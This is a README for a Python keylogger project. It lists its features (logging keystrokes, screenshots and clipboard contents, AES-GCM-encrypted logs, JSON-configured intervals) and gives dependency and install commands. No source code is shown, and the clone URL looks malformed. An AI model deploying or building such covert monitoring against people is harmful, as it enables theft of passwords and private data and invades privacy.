# Sophisticated Keylogger with AES Encryption and Additional Features

This Python script is an advanced keylogger that captures keystrokes, screenshots, and clipboard content. It includes AES-GCM encryption for securing log files and allows customization through a JSON configuration file.

## Features
- Captures keystrokes and logs them to a file.
- Takes periodic screenshots and saves them.
- Logs clipboard content to a separate file.
- Encrypts log files using AES-GCM encryption.
- Configurable logging and screenshot intervals via JSON file.

## Requirements
- Python 3.8
- `pynput` library for capturing keystrokes and clipboard content
- `pycryptodome` library for AES encryption
- `Pillow` library for taking screenshots

## Installation
Clone the repository and install the required libraries:
```bash
git clone https://github.com/jaysingh/GITHUB/sophisticated-keylogger.git
cd sophisticated-keylogger
pip install pynput pycryptodome pillow
